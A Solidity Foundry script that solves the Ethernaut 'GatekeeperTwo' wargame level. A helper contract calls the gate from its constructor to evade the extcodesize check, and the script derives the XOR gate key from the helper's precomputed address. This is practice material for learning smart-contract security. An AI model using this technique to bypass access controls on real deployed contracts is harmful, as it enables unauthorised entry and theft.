// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

/**
 *
 * Level address: 0x0C791D1923c738AC8c4ACFD0A60382eE5FF08a23
 * This gatekeeper introduces a few new challenges. Register as an entrant to
 * pass this level.
 *
 * Things that might help:
 * Remember what you've learned from getting past the first gatekeeper - the
 * first gate is the same.
 * The assembly keyword in the second gate allows a contract to access
 * functionality that is not native to vanilla
 * Solidity. See Solidity Assembly for more information. The extcodesize call in
 * this gate will get the size of a
 * contract's code at a given address - you can learn more about how and when
 * this is set in section 7 of the yellow
 * paper.
 * The ^ character in the third gate is a bitwise operation (XOR), and is used
 * here to apply another common bitwise
 * operation (see Solidity cheatsheet). The Coin Flip level is also a good place
 * to start when approaching this
 * challenge.
 *
 */
contract Pawn {
    constructor(GatekeeperTwo _gatekeeper, bytes8 _gateKey) {
        _gatekeeper.enter(_gateKey);
    }
}

contract GatekeeperTwoScript is Attacker {
    Level private level = Level(0x0C791D1923c738AC8c4ACFD0A60382eE5FF08a23);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        GatekeeperTwo gatekeeper = GatekeeperTwo(instance);

        uint256 nonce = vm.getNonce(me);
        address pawnAddr = vm.computeCreateAddress(me.addr, nonce);

        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(pawnAddr))))
            ^ type(uint64).max;

        new Pawn(gatekeeper, bytes8(gateKey));

        require(gatekeeper.entrant() == me.addr, "Entrant not set");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
